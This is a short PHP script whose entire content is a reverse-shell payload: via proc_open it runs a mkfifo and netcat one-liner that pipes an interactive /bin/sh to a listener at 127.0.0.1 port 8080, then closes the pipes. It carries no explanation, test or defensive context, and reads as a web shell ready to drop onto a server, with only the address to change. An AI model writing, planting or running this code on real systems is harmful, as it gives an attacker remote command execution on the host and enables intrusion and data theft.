<?php
$descriptors = array(
   0 => array("pipe", "r"),  // stdin
   1 => array("pipe", "w"),  // stdout
   2 => array("pipe", "w"),  // stderr
);

$process = proc_open('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 8080 >/tmp/f', $descriptors, $pipes);

if (is_resource($process)) {
    // Close the input stream
    fclose($pipes[0]);

    // Close the output stream
    fclose($pipes[1]);

    // Close the error stream
    fclose($pipes[2]);

    // Close the process
    proc_close($process);
}
?>
